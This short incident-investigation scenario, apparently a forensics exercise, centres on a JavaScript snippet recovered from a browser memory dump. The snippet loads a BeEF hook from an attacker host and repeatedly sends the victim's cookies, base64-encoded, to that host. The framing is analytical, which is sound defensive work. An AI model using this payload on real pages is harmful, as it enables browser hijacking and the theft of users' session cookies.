## BeEF Hooked Session

During an incident investigation, a memory dump from a victim's browser reveals the following JavaScript snippet running inside an active tab:

```javascript
(function() {
    var beefUrl = "http://192.168.1.105:3000/hook.js";
    var s = document.createElement("script");
    s.src = beefUrl;
    document.head.appendChild(s);

    setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "http://192.168.1.105:3000/cmd?sid=" + btoa(document.cookie), true);
        xhr.send();
    }, 5000);
})();
```

The victim's browser has no unusual extensions installed, but a coworker's machine — which had a malicious extension — accessed the same internal web application 20 minutes earlier.
